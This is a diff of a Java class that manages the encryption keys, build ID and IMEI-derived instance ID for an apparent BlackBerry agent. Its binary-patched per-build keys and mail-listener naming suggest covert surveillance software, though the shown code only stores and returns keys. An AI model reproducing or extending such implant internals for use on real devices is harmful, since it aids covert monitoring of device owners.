@@ -9,8 +9,12 @@
 package blackberry.config;
 
 import net.rim.device.api.system.GPRSInfo;
+import net.rim.device.api.system.RuntimeStore;
 import blackberry.crypto.Encryption;
 import blackberry.interfaces.Singleton;
+import blackberry.utils.Check;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
 import blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
@@ -18,14 +22,27 @@ import blackberry.utils.Utils;
  * The Class Keys.
  */
 public final class Keys implements Singleton {
-   
-    static Keys instance = null;
-    static InstanceKeys instanceKeys;
+
+    //#ifdef DEBUG
+    static Debug debug = new Debug("MailListener", DebugLevel.VERBOSE);
+    //#endif
+
+    InstanceKeys instanceKeys;
+
+    static private Keys instance = null;
+    private static final long GUID = 0x6b3d91c714d645e7L;
+
+    private static byte[] byteAesKey;
+    private static byte[] byteChallengeKey;
+    private static byte[] byteConfKey;
+    private static byte[] byteInstanceID;
+    private static byte[] byteBuildID;
+
     //#ifdef DEBUG
     public String log = "";
 
     //#endif
-    
+
     /**
      * Gets the single instance of Keys.
      * 
@@ -33,9 +50,15 @@ public final class Keys implements Singleton {
      */
     public static synchronized Keys getInstance() {
         if (instance == null) {
+          /*  instance = (Keys) RuntimeStore.getRuntimeStore().get(GUID);
+
+            if (instance == null) {
+                Keys singleton = new Keys();
+                RuntimeStore.getRuntimeStore().put(GUID, singleton);
+                instance = singleton;
+            }*/
             instance = new Keys();
         }
-
         return instance;
     };
 
@@ -44,25 +67,38 @@ public final class Keys implements Singleton {
      * 
      * @return true, if successful
      */
-    public static boolean hasBeenBinaryPatched() {
+    public boolean hasBeenBinaryPatched() {
+
         return instanceKeys.hasBeenBinaryPatched();
-    }        
+    }
 
     private Keys() {
+        instanceKeys = new InstanceKeys();
         final byte[] imei = GPRSInfo.getIMEI();
+        byteInstanceID = Encryption.SHA1(imei);
         
-        byte[] byteInstanceID = Encryption.SHA1(imei);
-        String instanceID = Utils.byteArrayToHex(byteInstanceID);
+        //#ifdef FAKE323   
+        if (!hasBeenBinaryPatched()) {
+            InstanceKeysEmbedded instance = new InstanceKeys323();
+            instance.injectKeys(instanceKeys);
+            
+        }
+        //#endif        
+        setInstanceKeys();
         
-        instanceKeys=new InstanceKeys(byteInstanceID, instanceID);
     }
-    
-    public void setInstanceKeys(InstanceKeysEmbedded embeddedKeys){
-        embeddedKeys.injectKeys(instanceKeys);
-    }
-    
-    public InstanceKeys getInstanceKeys(){
-        return instanceKeys;
+
+    private void setInstanceKeys() {
+        
+        byteAesKey = instanceKeys.getAesKey();
+        byteChallengeKey = instanceKeys.getChallengeKey();
+        byteConfKey = instanceKeys.getConfKey();
+        byteBuildID = instanceKeys.getBuildId();
+
+        //#ifdef DEBUG_TRACE
+        debug.trace("setInstanceKeys BuildID:"
+                + Utils.byteArrayToHex(byteBuildID));
+        //#endif
     }
 
     /**
@@ -71,7 +107,7 @@ public final class Keys implements Singleton {
      * @return the aes key
      */
     public byte[] getAesKey() {
-        return instanceKeys.getAesKey();
+        return byteAesKey;
 
     }
 
@@ -81,7 +117,7 @@ public final class Keys implements Singleton {
      * @return the builds the id
      */
     public byte[] getBuildId() {
-        return instanceKeys.getBuildId();
+        return byteBuildID;
     }
 
     /**
@@ -90,7 +126,7 @@ public final class Keys implements Singleton {
      * @return the challenge key
      */
     public byte[] getChallengeKey() {
-        return instanceKeys.getChallengeKey();
+        return byteChallengeKey;
     }
 
     /**
@@ -99,11 +135,7 @@ public final class Keys implements Singleton {
      * @return the conf key
      */
     public byte[] getConfKey() {
-        byte[] key= instanceKeys.getConfKey();
-        //#ifdef DEBUG
-        log=instanceKeys.log;
-         //#endif
-        return key;
+        return byteConfKey;
     }
 
     /**
@@ -112,7 +144,7 @@ public final class Keys implements Singleton {
      * @return the instance id
      */
     public byte[] getInstanceId() {
-        return instanceKeys.getInstanceId();
+        return byteInstanceID;
     }
 
 }
